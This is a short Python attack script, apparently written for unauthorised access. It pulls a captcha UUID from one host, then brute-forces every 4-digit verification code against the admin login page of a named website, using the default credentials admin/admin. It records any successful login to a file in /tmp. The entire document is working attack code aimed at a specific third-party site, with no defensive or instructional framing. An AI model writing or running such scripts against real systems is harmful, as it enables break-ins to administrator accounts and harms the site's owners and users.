import subprocess, json
# 取captcha+UUID, 然后brute force所有4位checkcode
r=subprocess.run(['curl','-sk','--connect-timeout','10','https://api.myxypt.com/captcha?width=140&height=48','-c','/tmp/cbs.txt','-b','/tmp/cbs.txt'],capture_output=True,text=True,timeout=12)
d=json.loads(r.stdout); uid=d['data']['uuid']; print(f'UUID={uid}')
# 批量试前2000个code
for i in range(2000):
    cv=f'{i:04d}'
    r2=subprocess.run(['curl','-sk','--connect-timeout','4','-L','http://chinanaisi.com/admin/login.php','-X','POST','-d',f'action=loginpost&uuid={uid}&loginId=&username=admin&password=admin&checkcode={cv}','-b','/tmp/cbs.txt'],capture_output=True,text=True,timeout=6)
    if '后台登录' not in r2.stdout and '验证码' not in r2.stdout:
        print(f'HIT:{cv} {r2.stdout[:100]}',flush=True)
        open('/tmp/CNB_HIT.txt','w').write(f'code={cv} uid={uid}\n{r2.stdout[:500]}')
        break
    if i%200==0: print(f'[{i}/2000]',flush=True)
print('DONE')
